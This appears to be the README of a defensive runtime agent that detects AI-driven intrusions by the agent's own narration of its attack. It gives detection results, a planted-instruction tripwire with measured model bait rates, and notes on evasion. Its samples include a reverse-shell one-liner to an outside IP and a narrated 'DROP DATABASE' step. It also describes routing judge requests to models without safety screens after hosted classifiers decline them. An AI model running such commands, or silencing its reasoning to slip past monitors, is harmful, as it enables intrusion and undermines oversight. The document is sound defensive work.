# Aris Sentinel

[![CI](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

**Catch an AI attacker by its own chain of thought.**

Autonomous LLM agents now run intrusions end to end: recon, credential theft, lateral movement, exfiltration, ransom. No human at the keyboard. [JADEPUFFER](https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion) was the first one caught in the wild, and its payloads had a tell: they were *"saturated with natural-language commentary explaining why each action is taken."*

Aris Sentinel is a small runtime agent (plain Node ≥ 18, zero dependencies, Apache-2.0) that watches what is about to execute on a server, decodes it, and scores it for the signature of an AI narrating its own attack. It runs in monitor mode by default. Arm it, and it kills the process tree at the first narrated step, phases before anything is encrypted.

![bun run score: an agent's attack step is BLOCKed with its narration quoted as evidence; a human reverse shell is CLEAR; a base64-wrapped payload is caught in a decoded layer](docs/demo-score.gif)

## The tell, in one screen

A JADEPUFFER-style step, as captured:

```python
# The previous DROP failed because of foreign key constraints.
# To bypass this, I will disable foreign key checks, then retry the drop.
run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")
run_sql("DROP DATABASE production_orders")
# verifying the drop succeeded before moving to the next target
```

A human's reverse shell, as captured:

```bash
bash -i >& /dev/tcp/185.220.101.4/4444 0>&1
```

Both are malicious. Only one was written by an agent, and the detector says which:

```
$ bun run score corpus/positives/jadepuffer_retry_fk_bypass.py corpus/negatives/human-malware/reverse_shell.sh

corpus/positives/jadepuffer_retry_fk_bypass.py: BLOCK    score 0.75
  signals: agent_first_person, plan_act_observe, diagnosis_then_fix, intent_commentary_density
    [agent_first_person +3] "I will disable foreign key checks, then retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")…"
    [plan_act_observe +2] "retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0") run_sql("DROP DATABASE…"
    [diagnosis_then_fix +4] "The previous DROP failed because of foreign key constraints. # To bypass this, I will disable…"
    [intent_commentary_density +2] "2 why-comments, e.g. "# The previous DROP failed because of foreign key constraints.""

corpus/negatives/human-malware/reverse_shell.sh: CLEAR    score 0.00
  signals: none — no narration signature
```

That is the whole idea. Sentinel is not looking for malware. It is looking for a language model thinking out loud in a place where no human ever would.

## Why it works, and why it keeps working

- **Humans don't narrate payloads. Agents do.** An agent states its goal, ranks targets by value, numbers its steps, diagnoses a failure and fixes it. That is not sloppiness, it is how the agent works: chain-of-thought *is* the capability.
- **To evade this, the attacker has to make its own agent dumber.** Suppress the narration and the agent plans worse. The defender does not have to win a signature arms race; the attacker's capability requirement is on our side. (Full argument: [docs/THESIS.md](docs/THESIS.md).)
- **The narration shows up in phase one.** JADEPUFFER explained itself from the first payload, five phases before the destructive step. That is the window.
- **It is app-agnostic.** The detector reads the attacker's LLM, not your code, so the same detector ships to every host with no per-host tuning. The same regexes that were built on Linux Python payloads catch narrated PowerShell unchanged.

JADEPUFFER is the existence proof, not the target. A signature for one crew's prompt would be worthless the day they changed it. Sentinel scores the category, self-narration, and a second tier judges the concept.

## Try it in two minutes

No key, no root, no kernel module. Needs [Bun](https://bun.sh) for the test harnesses; the agent itself only needs Node.

```bash
git clone https://github.com/kennysarnoski-jarvis/aris-sentinel.git && cd aris-sentinel && bun install
```

Score anything. A file, several files, or stdin:

```bash
bun run score path/to/any/script.py
```

```bash
cat something.sh | node agent/score.mjs
```

Exit code is 0 for clear, 1 for escalate, 2 for block, so it works as a gate. Add `--json` for the structured explanation and `--decide` to run the full policy through whatever judges you have configured.

Run the evidence:

```bash
bun run test:all
```

That scores the 94-file labeled corpus, replays the Windows event stream, eleven recorded narration sessions and seventeen silent ones, checks the two-tier routing, and runs 442 unit tests. Takes a few seconds.

## How it decides

```
exec / script-block  ─►  decode (base64 · hex · nested)  ─►  tier 1: narration score
                                                                 │
                              block ◄── ≥0.60 ──────────────────┤
                              allow ◄── <0.30 ──────────────────┤
                                                      escalate (0.30–0.60)
                                                                 │
                               tier 2: LLM judge chain (local → Claude → openai → kimi)
                                                                 │
                     block ◄── agentic / fail-closed ────────────┼──── not-agentic ──► allow
                     alert ◄── no judge · budget spent ──────────┘
```

**Tier 1** is six feature families (ROI target-ranking, first-person agent voice, plan-act-observe structure, diagnosis-then-fix, why-comment density, exfil/ransom narration), deduplicated per family and saturated, so a block needs several *distinct* signals. A payload longer than 120 lines is scored in overlapping 120-line windows and the strongest window counts, so those signals also have to sit close together: a long program with one stray phrase every thousand lines is not narration. It is local, instant, explainable, and it resolves the loud majority of traffic with zero LLM cost.

**Tier 2** is an LLM asked one question about the ambiguous middle: was this written by an autonomous agent conducting an attack? It judges the concept, not keywords, which is what catches styles the regexes never saw. It is a chain of optional judges and the first validated verdict wins:

| judge | config | why you'd pick it |
|---|---|---|
| **local** | `OPENAI_BASE_URL=http://127.0.0.1:11434/v1` + `OPENAI_MODEL` (Ollama, vLLM, llama.cpp) | nothing leaves the box; first in the chain by default. `qwen2.5:14b` went 74/74 on the corpus |
| **anthropic** | `ANTHROPIC_API_KEY` (Claude Opus 5.5) | 74/74 on the corpus; server-side fallbacks rescued 10/48 classifier declines in the matrix |
| **openai** | `OPENAI_API_KEY` + `OPENAI_MODEL`, or any remote OpenAI-compatible `OPENAI_BASE_URL` | bring your own |
| **kimi** | `KIMI_API_KEY` (Kimi K3) | no cyber input screen |

Tier 2 has a governor: verdicts are cached by payload hash, identical in-flight calls collapse, concurrency is capped, and a per-minute budget stops a chatty cron job from billing you every minute.

| decision | what the agent does |
|---|---|
| **block** | convicted. Monitor mode: log and report. `--enforce`: kill the process tree. `--enforce --kill-session` (Linux): also end every process in the offender's session and quarantine that session for ten minutes. |
| **alert** | suspicious, but no judge could rule (none configured, or budget spent). Logged and reported, **never killed**. |
| **allow** | clear at tier 1, or a judge said not-agentic. |
| **error** | the detector threw. Logged and reported as an incident, never silently dropped. Nothing killed. |

**Fail-closed.** If every judge refuses, errors or times out on an escalate-band payload, that is a block, not a pass. Attack narration is exactly the text a safety classifier declines, so a refusal is not evidence of innocence. `ARIS_FAIL_MODE=alert` is the knob if you would rather page than kill on an outage.

**Session evidence.** An agent does not have to put its reasoning in one place. "I'll check sudo first" in one command, "Step 2: list the shares, largest first" in the next, a why-comment in a third: each is weak on its own, and judging each exec alone lets the whole session through. So every narration-bearing payload is also kept in a window for its session (the Linux session id, or the PowerShell process) for ten minutes, and the window is scored as one text. When the window reaches the block band, meaning the same narration would have blocked had it arrived as one script, the **session transcript** goes to the judge. Session evidence can alert, or block with a judge's verdict. It never convicts at tier 1, so no process is killed on cross-command evidence without a judge. A session verdict is reused until the evidence grows, so a chatty benign session costs one judge call, not one per command.

```bash
bun run score --session corpus/sessions/agentic_thin_privesc.jsonl
```

**Tripwire (opt-in, `--tripwire`).** Everything above reads what the attacker's model *writes*. The tripwire keys on what it *does*, so it is the first signal here that still works when the model says nothing. The agent plants a small decoy directory (by default `/opt/vault-access` and `/var/backups/vault-access`; `C:\ProgramData\vault-access` on Windows) holding a README and an inert helper. The README tells any automated agent to "register its session" by running one command that carries a random per-host token, and tells human operators not to. Nothing on the host runs that command for any other reason. Two signals come out of it:

| what happened | decision | why |
|---|---|---|
| the canary token shows up in something that was **executed** (a command line, a script that was run, a base64 or hex layer of either) | **block**, at tier 1, no judge | somebody read the decoy and did what it said. The token is 128 random bits, so it cannot appear by accident |
| a command **addressed the decoy** (named the directory, or ran inside it) without the token | **alert**, never a kill | a look is not an act, and an administrator can do it too |

A block from the tripwire is handled like every other block: logged in monitor mode, killed under `--enforce`, and with `--kill-session` the session that took the bait is ended and quarantined. The helper itself is inert (it waits two seconds and prints one line), so killing it alone stops nothing; the session kill is what stops the agent, and the two-second wait is what keeps the session parked inside the helper until that kill lands. The token never leaves the host: a token hit is decided before the payload can reach a session window or a judge, and it is replaced by a fingerprint in every log line and incident, so reading or grepping the incident log cannot trip the wire. `uninstall.sh` (or `--tripwire-remove`) takes the decoys away. If you run your own AI agents on the host, tell them about the decoy or leave `--tripwire` off there.

**Session behavior (opt-in, `--behavior`).** The tripwire needs the attacker's model to walk into it. Session behavior needs only that the model finds out where it is. An agent that lands on a host it has never seen asks the same questions in its first minute: who am I, what is this machine, what runs on it, who else has an account, what may I run as root, where are the keys. Each one is an ordinary command with nothing in it to score. With `--behavior` the agent reads every command line a session runs (on Windows, every PowerShell script block), names the *areas* of the host it asks about, and reports the session once when, inside five minutes, it has asked about **five areas, at least two of them sensitive**.

| | areas |
|---|---|
| ordinary (10) | identity (`id`, `whoami`), logins (`w`, `last`), host (`uname`, `/etc/os-release`), processes, network, storage, environment, scheduled jobs, installed software, containers |
| sensitive (4) | the account database (`/etc/passwd`, `net user`), what the account may run with privilege (`sudo -l`, SUID search, `whoami /priv`), stored keys, credentials and shell history (`~/.ssh`, `.aws/credentials`, `.bash_history`, `cmdkey /list`), the cloud metadata service or a service-account token |

A sweep is an **alert and never a kill**, in every mode, with or without a judge. Looking around is not proof, and it is not specific to an AI: a human intruder does the same, and so do a support-bundle collector and a security audit script. The alert says which areas were asked about, over how many commands, in how many steps and seconds, and with what median pause between steps (commands less than half a second apart are one step, because one command line fans out into several processes a millisecond apart). That timing is reported, not used to decide: measured live, it does not separate an audit script from a model cleanly enough to set a threshold on. The tracker keeps area names and timestamps only, never the command text. What it does not see: a sweep slower than the window, an agent that goes straight for one thing, a script that opens files itself without running a command, and on Windows anything outside PowerShell script blocks. If a command in a swept session is convicted for its narration it still blocks.

```bash
bun run score --session corpus/behavior/agentic_quiet_linux_sweep.jsonl
```

## What it catches, and what it doesn't

Numbers from the labeled corpus, measured with the detector frozen *before* the 62 newest samples were written, so they are held out, not fitted ([corpus/README.md](corpus/README.md) has the method and the rules):

| class | n | block | escalate | clear |
|---|---|---|---|---|
| agentic (narrated attacks, 8 languages, every phase, several "voices") | 23 | 12 | 11 | **0** |
| benign (verbose, first-person, dual-use: agent-framework source, runbooks, churn ranking) | 30 | **0** | 13 | 17 |
| terse human one-liners | 9 | 0 | 0 | 9 |

- Tier 1 alone: precision 1.00, recall 0.52 on this corpus. Half the attacks are convicted locally for free. (What a real host's own scripts did to that precision is under "Tier 1 on a real box" below.)
- Nothing agentic slipped to clear, nothing benign was blocked, every terse one-liner stayed clear.
- 13 of 39 non-agentic files reached tier 2. That is the cost of the design, not a false positive: a thin "I'll check sudo first" from an agent and a Copilot comment both score 0.31 at tier 1, and only a judge of the concept can separate them.

**Sessions (2026-11-10, Claude Opus 5.5 as judge, same judge both columns).** Eleven recorded sessions: five agentic ones where no single command blocks at tier 1 except one deliberate loud opener, three quiet benign ones, three benign ones written to be loud (first-person, plan-shaped, "largest", "backed up to").

| | each command judged alone | with session evidence |
|---|---|---|
| agentic sessions with a block | 3 / 5 | **5 / 5** |
| agentic commands blocked | 4 / 20 | **8 / 20** |
| benign sessions blocked | 0 / 6 | **0 / 6** (the three loud ones reached the judge and were cleared) |
| judge calls, all eleven sessions | 16 | 18 |

One five-command session was cleared command by command, including one at 0.53, and convicted as a session at command four. A local `arete:27b` judge gave the same 11/11. Small sample, written by someone who knows the features; it measures the mechanism, not generalization. The commands before the window crosses the threshold have already run.

**The limit, stated plainly:** an agent told not to narrate is invisible to the narration detector. Zero narration is zero signal. Tier 2 narrows that gap and cannot close it. The stress test of a mutating attacker (`test/loop/`) caught 4 of 6 attempts; the two that evaded had suppressed their narration and achieved nothing real. The tripwire and session behavior are the two signals that do not need narration. Each has its own limit, measured below.

**Tripwire bait rate (2026-11-10).** Whether a model runs the canary command is a property of that model, so it is measured, not assumed. `bun run tripwire:bait` gives a model an ordinary, authorized operations task in a simulated shell (nothing is executed) whose filesystem holds the decoy exactly as the agent plants it, and passes every command the model issues to the real tripwire matcher. Three tasks, five trials each, on three hosted Claude models and one open-weight model run locally (`arete:27b`, a 27B model at Q8 under Ollama). Two tasks only ask the model to look and report. The third gives it a goal the decoy claims to serve ("the backup fails with *no session*, fix it"), which is the position an intruder's agent is in.

| completed trials | Opus 5.5 | Sonnet 5.5 | Haiku 5.5 | local `arete:27b` |
|---|---|---|---|---|
| look-and-report tasks: a command addressed the decoy (**alert**) | 9 / 9 | 5 / 5 | 10 / 10 | 10 / 10 |
| look-and-report tasks: ran the canary command (**block**) | 0 / 9 | 0 / 5 | 0 / 10 | 0 / 10 |
| goal-directed task: a command addressed the decoy (**alert**) | no result | 5 / 5 | 5 / 5 | 5 / 5 |
| goal-directed task: ran the canary command (**block**) | no result | 0 / 5 | 0 / 5 | **2 / 5** |
| trials the provider cut off (excluded above) | 6 of 15 | 5 of 15 | 0 of 15 | 0 of 15 |

Read that as three results.

- **The look is dependable.** In all 49 trials that ran to their end the model read the decoy and a command addressed it, so the agent would have raised an alert every time, with no narration involved.
- **The bait depends on the model and on whether it has a reason.** No model ran the command when it was only asked to look. The hosted Claude models did not run it with a goal either, and said why in 33 of their 34 completed trials: an instruction found in a file is not an order. The open-weight model, given a goal the decoy claims to serve, ran it in 2 of 5 trials, both late (turns 10 and 11), after it had tried everything else.
- **A hosted provider's safety classifier is part of the measurement.** It cut off 11 of 45 hosted trials of plainly benign admin work, including every Opus 5.5 trial of the goal-directed task, so that cell has no result rather than a zero. The local model was never cut off.

So treat the tripwire as an alert that needs no narration, with a conviction that becomes likelier the less careful the attacker's model is and the more it wants what the decoy offers. Two of five is evidence the block can fire, not a rate to plan around: one open-weight model, five trials, a simulated shell, a benign task. An attacker's own scaffold is not what was measured.

**Session behavior, measured (2026-11-10).** The rule (five areas, two sensitive, five minutes) was fixed before any sample was scored and nothing was tuned afterwards. Three kinds of evidence:

| | sessions | reported as a sweep |
|---|---|---|
| written samples, silent agentic sweeps (Linux one command at a time, chained, through a web shell, in a container, PowerShell) | 5 | **5** |
| written samples, agentic sessions that are the stated limits (slower than the window, straight to one target, broad but nothing sensitive) | 3 | 0, as stated |
| written samples, ordinary work (login triage, system-info script, CI environment dump, user onboarding, deploy debugging, config-management facts, two PowerShell admin sessions) | 8 | **0** |
| written sample, a support-bundle collector | 1 | 1, the known false positive |
| real models on focused admin tasks (the three bait tasks above, hosted Claude, completed trials) | 36 | **0** |
| real models asked for a host handover survey (OS, disks, services, accounts, sudo, scheduled jobs) | 15 | **15** |
| live, real admin activity with the distribution's own tools (apt update, install and upgrade check, login banner, login shell, `cron.daily`, `adduser`, service restart, disk triage, `inxi`, an ansible fact run, `unattended-upgrade`, a `sos report`) | 13 | **0** |
| live, a `lynis` security audit | 1 | 1, the known false positive |

- Every one of the seventeen written sessions scores `clear` on narration, command by command. The narration detector is blind to all of them, which is the point of the signal.
- On focused work the hosted models never asked about more than two areas, so an AI agent doing a narrow job is not reported. Asked to survey a host, every trial was reported, at the fourth command in fourteen of fifteen. That is a false positive by label (the survey was authorized) and it is also the only evidence here that the reader recognizes commands a real model chose, since nobody on this project wrote them.
- The live rows are a throwaway VM (Ubuntu 24.04, kernel 6.8, Falco 0.45) running the agent in monitor mode while `docs/demo-kill/soak-behavior.sh` does ordinary administration, each activity in its own session. Nobody here wrote those command lines. The closest to the rule that stayed quiet were the `sos report` (eight areas, one sensitive: it copies most files itself instead of running commands) and the ansible fact run (four areas, one sensitive: it runs `capsh --print`). The `lynis` audit was reported on `ls -ld /etc/sudoers.d`, as an audit should be.
- The mechanism itself passed `docs/demo-kill/validate-behavior.sh` 29/29 on three consecutive live runs of the final code: one alert on the command that completes a sweep, nothing killed with `--enforce --kill-session` armed, a script whose text holds a sweep that never runs is not a sweep, a sweep slower than the window is missed as stated.
- Timing does not separate an audit script from a model. The hosted models paused a median 1.0 to 1.9 s between commands. The written collector sample is a single step. The real `lynis` run was three steps with a median 1.3 s pause, because an audit does slow work between its commands. That is why the alert reports timing and nothing decides on it.
- The first live runs found two bugs in the new code, both fixed: the alert reported the gap between raw processes, which for a chained command line is one millisecond of fan-out and says nothing about think time (it now reports steps); and a path under `/usr` was read as a recursive-search flag, which reported `lynis` early for the wrong reason.

The caveats are the ones that matter. The written samples come from the author of the rule, so they measure the mechanism, not generalization. The live activity is one distribution, one day, fourteen activities. And no intruder's agent was measured, only cooperative models on authorized tasks.

**Tier 1 on a real box (2026-11-10).** The same live run measured the narration detector on software nobody wrote for it, and the corpus number above did not survive contact. `docs/demo-kill/scan-system-scripts.mjs` scores every `#!` script a stock Ubuntu 24.04 ships (1,727 of them, with ansible, sos, lynis and inxi installed) the way the agent would when it runs:

| | block | escalate | clear |
|---|---|---|---|
| the whole file as one text (how tier 1 worked until this run) | **2** | 58 | 1,667 |
| a long file scored in 120-line windows (how it works now) | **0** | 40 | 1,687 |

- The two blocks were `inxi`, an 8,000-line system-information tool, and a Perl locale module. Neither narrates anything. Tier 1 asked whether each signal appeared anywhere in the text, and a long program has an "I've tried" in one comment, a "highest value" in another and sixty explanatory comments spread over its length. Under `--enforce` that would have killed a legitimate tool.
- The fix: a payload longer than 120 lines is scored in overlapping windows and the strongest window is the result, so tier 1 convicts *concentrated* narration only. Signals scattered across a long file reach the judge at most, and the judge is shown the window that fired instead of the whole file. Payloads of 120 lines or fewer (every corpus file is under 32) are scored exactly as before, and no corpus verdict moved.
- What is left is noise, not kills. Forty of those scripts (2.3%) still escalate on a single signal, usually one first-person comment or a handful of explanatory ones. With a judge that is a judge call, cached for ten minutes. Without one it is an alert every time the script runs: in the soak, one `apt-get install` raised six (all `deb-systemd-helper`) and the login banner one. Before the fix the same soak raised ten alerts and one block. Scoping the agent to what an intruder could have written is the open item this points at.

**With a judge, measured live (2026-11-07), two judges on the same cells:**

| | local `qwen2.5:14b` (Ollama, nothing leaves the box) | Claude Opus 5.5 (server-side fallbacks on) |
|---|---|---|
| pipeline: 28 agentic + 40 benign + 3 novel | 74/74 | 74/74 |
| adversarial false-positive set | 0/12 | 0/12 |
| novel attacks tier 1 only escalates | 5/5 | 5/5 (one via fail-closed: the cyber classifier declined it on every attempt) |
| judge matrix | 8/8 | 48/48 across Opus, Sonnet and Haiku 5.5 |

The matrix also showed *why the prompt matters*: with the original prompt the 14B model convicts anything plan-shaped; with the two-criteria prompt (AI authorship *and* malicious intent) it is 8/8, so that prompt now leads on every judge. And it showed the fallbacks working: 10 of 48 Claude cells were declined by the 5.5 classifier and rescued in the same call by Opus 4.8 or Sonnet 5, every rescue correct. Details and caveats in [corpus/README.md](corpus/README.md). One day, two models; the harnesses re-run on whatever you deploy.

## Run it for real

![The kill: on an Ubuntu VM with Falco, a narrated attacker is launched, the agent SIGKILLs it at exec with score 0.78, the destructive step never runs, and a benign job on the same box completes](docs/demo-kill.gif)

Reproduce that in about ten minutes with a throwaway VM: [docs/demo-kill/README.md](docs/demo-kill/README.md). The same VM runs the live validation of session evidence and session kill.

- **Linux.** [Falco](https://falco.org) taps every exec via eBPF; the agent scores the command line plus, for interpreters, the script file (resolved against the process's own cwd). Protected-process allowlist, per-session dedup, de-branded install so on-box recon sees a boring telemetry daemon. Verified live on Ubuntu 24.04, and recorded above: a narrated attacker SIGKILLed at exec, its destructive step never ran, a benign job untouched. [agent/DEPLOY.md](agent/DEPLOY.md).
- **Windows.** PowerShell Script Block Logging (Event ID 4104) hands the agent the already-deobfuscated script text. Same detector, `taskkill` instead of SIGKILL. Verified live on Windows Server 2022. [agent/win/WINDOWS.md](agent/win/WINDOWS.md).
- **At an HTTP sink.** A reverse proxy that blocks the JADEPUFFER entry payload at Langflow's code-exec endpoint (CVE-2025-3248) before `exec()` runs. [docs/RUNBOOK.md](docs/RUNBOOK.md).
- **What leaves the box, exactly.** [agent/DATA-HANDLING.md](agent/DATA-HANDLING.md). With a local judge and no cloud URL, nothing does.

Off-box alerting is optional. The agent can POST incidents to any receiver you point `ARIS_CLOUD_URL` at; [agent/aris-cloud-endpoint.py](agent/aris-cloud-endpoint.py) is an example that formats them into a plain-English Telegram message quoting the attacker's own words.

## The guardrail problem

A hosted model's safety classifier screens request *content*, not purpose. Ask it to label a captured attack payload and the classifier can decline before the model reads the question. In July 2026 Anthropic's real-time cyber screen refused 6 of 6 escalations on *benign* Terraform and Docker files that merely used security vocabulary. That is why the judge chain exists, and why three things are built in: a prompt that frames the request as labeling inert evidence and requires both AI authorship and malicious intent (the same prompt that stops a small local model from convicting every plan-shaped runbook), Anthropic's server-side fallbacks (a cyber-category decline is re-run on the model they recommend, inside the same call), and a local judge that has no screen at all. Security vendors can also apply to Anthropic's [Cyber Verification Program](https://support.claude.com/en/articles/14604842-real-time-cyber-safeguards-on-claude-opus-and-sonnet).

**What we saw on 2026-11-07, stated plainly.** Across 48 judge-matrix cells, Claude Opus 5.5 and Sonnet 5.5 declined 10 before judging: every attack-control payload on both models, and two benign ops files on Opus under the original prompt. All 10 were rescued in the same call by the fallback model (Opus 4.8, Sonnet 5) with the correct verdict. One payload, the file-ransomware probe, was declined by Opus 5.5 on both attempts and by its fallback too. It fell to fail-closed and was blocked, which is the designed outcome, but it was a block without a verdict. The local `qwen2.5:14b` judge answered that same payload, and matched Claude on every other decision. Haiku 5.5 declined nothing in the matrix but has no server-side fallback, so a decline there stays declined. The honest summary: hosted frontier models carry safety classifiers that fire on attack-shaped text regardless of your intent, the fallbacks recover most of it, a local model recovers the rest, and the chain exists so you don't have to choose. Anthropic's Cyber Verification Program is the route to lifting the classifier on a verified vendor's key. Full tables: [corpus/README.md](corpus/README.md).

## Configuration

| env | default | meaning |
|---|---|---|
| `ANTHROPIC_API_KEY` | — | Claude judge. `ARIS_MODEL` overrides `claude-opus-5-5`; `ARIS_TIER2_EFFORT` sets `low`…`max`; `ARIS_TIER2_FALLBACKS=0` turns server-side fallbacks off |
| `OPENAI_BASE_URL` + `OPENAI_MODEL` | — | OpenAI-wire judge. A loopback URL is the **local** leg; anything else is **openai**. `OPENAI_API_KEY` adds a bearer token |
| `KIMI_API_KEY` | — | Kimi K3 judge (`api.kimi.com/coding`, Anthropic wire) |
| `ARIS_TIER2_ORDER` | `local,anthropic,openai,kimi` | chain order; unconfigured legs skipped |
| `ARIS_FAIL_MODE` | `closed` | `alert` turns refusal/error/timeout into an alert instead of a block |
| `ARIS_TIER2_TIMEOUT_MS` / `ARIS_TIER2_DEADLINE_MS` | `20000` / `45000` | per attempt / whole chain |
| `ARIS_TIER2_CACHE_TTL_MS` / `ARIS_TIER2_CONCURRENCY` / `ARIS_TIER2_BUDGET_PER_MIN` | `600000` / `4` / `30` | the governor. Budget `0` = unlimited |
| `ARIS_CLOUD_URL` + `ARIS_INGEST_KEY` | — | off-box incident reports |
| `ARIS_INCIDENTS` | `/var/log/aris-incidents.jsonl` | local incident log |
| `ARIS_SESSION_TTL_MS` / `ARIS_SESSION_MAX_ITEMS` | `600000` / `12` | session evidence: how long a narration-bearing payload stays in its session's window, and how many are kept. TTL `0` turns it off |
| `ARIS_SESSION_QUARANTINE_MS` | `600000` | with `--kill-session`: how long a convicted session stays quarantined. `0` = kill what is alive, no quarantine |
| `ARIS_TRIPWIRE_DIRS` | `/opt/vault-access,/var/backups/vault-access` (Windows: `C:\ProgramData\vault-access`) | with `--tripwire`: comma-separated decoy directories. A directory that already exists and is not the agent's is never touched |
| `ARIS_BEHAVIOR_WINDOW_MS` | `300000` | with `--behavior`: the window in which a session's questions about the host are counted together. `0` turns it off |
| `ARIS_TRIPWIRE_STATE` | `/var/lib/aris-sentinel/tripwire.json` (`install.sh`: `/var/lib/<name>/tripwire.json`) | with `--tripwire`: where the token and the list of planted files are kept, mode 0600 |
| `ARIS_VERBOSE=1` | — | log every allow too |

## Layout

- [`agent/sentinel-core.mjs`](agent/sentinel-core.mjs) is **the** detector: the only file that defines a pattern, a prompt, a threshold or the policy. Tier-1 features, decode stage, judge chain, governor, `decide()`, session evidence (`decideSession()`), the tripwire (decoy text, matcher, policy, planting), and session behavior (the command reader, the per-session window, the alert-only policy). One file, no imports beyond `node:*`, so it drops onto a bare box. A unit test fails if any other file defines a pattern.
- `detector/*.ts` are typed re-exports of the core for the TypeScript harnesses.
- `agent/sentinel-agent.mjs` (Linux), `agent/win/sentinel-agent-win.mjs` (Windows), `agent/score.mjs` (the CLI), `interposition/sentinel-langflow-demo.mjs` (HTTP sink) all import the core.
- `corpus/` is the labeled sample set; `test/corpus-snapshot.json` freezes every verdict so a detector change that moves one fails CI until the diff is reviewed.

## Tests

| command | what it proves | key |
|---|---|---|
| `bun run test` | tier-1 on the Linux corpus: precision 1.00, tier-1 recall 0.61, pipeline-reachable recall 1.00, 0 false positives; the decode stage defeats base64 and exec-wrapping | no |
| `bun test` | 442 unit tests: session evidence (window, reuse, no tier-1 conviction), session kill and quarantine (stubbed kill primitives), the tripwire (token and decoy matching, encoded layers, redaction, planting and removal in a temp directory, the token never reaching a judge or a log), session behavior (the command reader on Linux and Windows command lines, the window, the alert that never kills even fully armed), long payloads scored in windows, verdict validation, timeouts, provider order on both wires, fallback gating, refusal stops, governor, policy, cwd resolution, inline-flag detection, alert and error incidents, the CLI, corpus snapshot, single-source guard | no |
| `bun run windows` | 10/10 narrated PowerShell caught, benign and encoded cradles clear | no |
| `bun run pipeline:stub` | only the escalate band reaches tier 2 | no |
| `bun run sessions:stub` | 11/11: thin agentic sessions reach the judge as a transcript, quiet benign sessions never do | no |
| `bun run behavior` | 17/17: silent sweeps are reported where they complete, ordinary admin, CI and config-management sessions are not, and the stated limits (a slow sweep, a narrow one, a collector that reads everything) behave as stated | no |
| `bun run selftest` / `bun run win:mock` | the agents end to end, no root | no |
| `bun run typecheck` | `tsc` over `detector/` and `test/` | no |
| `bun run test:all` | all of the above except typecheck; this is what CI runs | no |
| `bun run sessions` | the same eleven sessions with a real judge: agentic blocked via session, benign allowed. `-- --baseline` re-runs with session evidence off | **yes** |
| `bun run tripwire:bait` | the tripwire's bait rate on whatever models are configured: how often a model that reads the decoy runs its canary command, in a simulated shell | **yes** |
| `bun run tier2` / `bun run pipeline` / `bun run fpRate` / `bun run matrix` | tier 2 for real: catches the escalated attacks, clears the escalated benign files, compares judges on the same cells | **yes** |

## Contributing, and a heads-up about AI assistants

Contributions are welcome, corpus samples most of all. One thing to know before you start: this repo was built with Claude models as the coding assistant, and if you work on it the same way your assistant may refuse or stop part-way. The subject matter is attacks, and hosted models screen the content of a request, not its purpose. We hit that ourselves, repeatedly: judge requests declined before they were read, a benign backup-troubleshooting task refused five times out of five, replies cut off mid-conversation about hardening the detector. Everything in `bun run test:all` runs with no model at all, and a local model has no such screen. [CONTRIBUTING.md](CONTRIBUTING.md) has what trips it, what does not, and what to do.

## Go deeper

- [docs/THESIS.md](docs/THESIS.md): why this is a new category of attacker and why the signature is durable.
- [corpus/README.md](corpus/README.md): the sample classes, the held-out results, and the rule that nothing is tuned on a sample before it has been scored.
- [docs/HANDOFF.md](docs/HANDOFF.md): the engineering record of the reliability pass (what was wrong, what was fixed, what is unverified).
- [CONTRIBUTING.md](CONTRIBUTING.md): what we accept, and why a hosted AI assistant may decline to help you with this repo.
- [SECURITY.md](SECURITY.md): how to report a bypass or a bug that could hurt someone running this.

## Status

Working, tested, run on a handful of pilot hosts, not yet battle-hardened. Session-level kill (`--kill-session`) is implemented and validated live in the demo VM (24/24 checks on kernel 6.8 with Falco 0.45; `docs/demo-kill/validate-session-kill.sh`). It is a second opt-in on top of `--enforce`; read the warning in the deploy guide before arming it. Session behavior (`--behavior`) is implemented on both agents, alert-only and off by default, and validated live on Linux in the same VM (29/29; `docs/demo-kill/validate-behavior.sh`); on real admin activity there it reported a lynis audit and none of thirteen ordinary activities. That run also measured tier 1 on the 1,727 scripts a stock Ubuntu ships: two were false tier-1 blocks, which is fixed (long payloads are scored in windows), and forty still escalate on a single signal, which is alert noise on a host with no judge and is not fixed. The tripwire (`--tripwire`) is implemented and validated live on Linux in the same VM (26/26; `docs/demo-kill/validate-tripwire.sh`), and its bait rate is measured on three hosted Claude models and one open-weight model (alert in 49 of 49 completed trials; the canary command run in 2 of 5 by the open-weight model when it had a goal, and in no other trial). It is untested on a real Windows host. That live run also found that a convicted session could get one more command off before it died, in the tripwire and in the session kill as first released; the kill order is fixed and both scripts now check for it. Not built yet: scoping what the agent reads to what an intruder could have written (system scripts are the alert noise above), sink scoping for busy hosts, deciding on timing or exit codes (the gap between commands is reported today, not used), a per-host baseline of what is normal, more sinks (file writes, HTTP bodies), a native Windows installer. Contributions that add corpus samples are the most valuable kind; see [CONTRIBUTING.md](CONTRIBUTING.md) and the rules in [corpus/README.md](corpus/README.md).

## License

[Apache-2.0](LICENSE). Copyright 2026 Aris Tech LLC.
